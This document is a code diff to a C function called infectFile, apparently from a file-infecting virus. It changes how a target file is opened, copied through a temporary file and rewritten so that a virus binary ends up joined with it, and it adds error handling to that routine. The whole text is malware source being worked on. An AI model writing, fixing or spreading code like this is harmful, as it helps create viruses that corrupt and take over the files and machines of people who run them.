@@ -112,7 +112,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
 
     // Create temporary file
     char *tempFileName = "concatBin";
-    FILE *fileToInfect = fopen(fileToInfectName, "rb+");
+    FILE *fileToInfect = fopen(fileToInfectName, "rb");
     if (fileToInfect == NULL) {
         printf("Could not open file to infect: %s\n", fileToInfectName);
         return -1;
@@ -169,7 +169,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
 	remove(tempFileName);
 	return -1;
     }
-    // Copy file to infect binary
+    // Copy original file to temp file
     if (copyFile(fileToInfect, tempFile, 0, EOF) < 0) {
         printf("Could not copy infected file to temp file\n");
         fclose(fileToInfect);
@@ -179,10 +179,23 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         return -1;
     }
     fclose(virusFile);
+    fclose(fileToInfect);
+    fclose(tempFile);
 
     // Copy temp file to infected file
-    fseek(fileToInfect, 0, SEEK_SET);
-    fseek(tempFile, 0, SEEK_SET);
+    fileToInfect = fopen(fileToInfectName, "ab");
+    if (fileToInfect == NULL) {
+        printf("Could not open file to infect: %s\n", fileToInfectName);
+        remove(tempFileName);
+        return -1;
+    }
+    tempFile = fopen(tempFileName, "rb");
+    if (tempFile == NULL) {
+        printf("Could not open temporary file\n");
+        fclose(fileToInfect);
+        return -1;
+    }
+
     if (copyFile(tempFile, fileToInfect, 0, EOF) < 0) {
         printf("Could not copy temp file to infected file\n");
         fclose(fileToInfect);
